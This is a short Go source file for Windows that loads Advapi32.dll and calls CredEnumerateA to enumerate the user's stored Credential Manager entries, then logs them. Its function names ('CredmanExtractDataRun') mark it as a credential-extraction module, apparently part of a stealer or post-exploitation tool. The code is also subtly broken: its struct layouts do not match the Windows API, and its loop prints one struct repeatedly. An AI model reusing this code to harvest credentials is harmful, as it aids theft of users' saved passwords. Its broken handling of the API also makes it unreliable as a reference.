package windows

import (
	"log"
	"syscall"
	"unsafe"
)

type lifetime struct {
	LowDateTime uint32
	HighDateTime uint32
}

type CredAttr struct {
	Keyword *string
	Flags uint32
	Valuesize uint32
	Value *string
}

type Creds struct {
	FLAG uint32
	TYPE uint32
	TargetName *string
	Comment *string
	LastWritten lifetime
	CredentialBlobSize uint32
	CredentialBlob *string
	Persist uint32
	AttrCount uint32
	Attributes CredAttr
	TargetAlias *string
	Username *string
}

func CredManModuleStart(){
	var (
		dlladvapi32  = syscall.NewLazyDLL("Advapi32.dll")
		CreaEnumerateA   = dlladvapi32.NewProc("CredEnumerateA")
	)
	var count uint64
	var creds Creds
	CreaEnumerateA.Call(0, 0, uintptr(unsafe.Pointer(&count)), uintptr(unsafe.Pointer(&creds)))

	for i :=0; i < int(count); i++{
		log.Print(creds)
	}
}

func CredmanExtractDataRun(){
	log.Println("Credman start")
	CredManModuleStart()
}
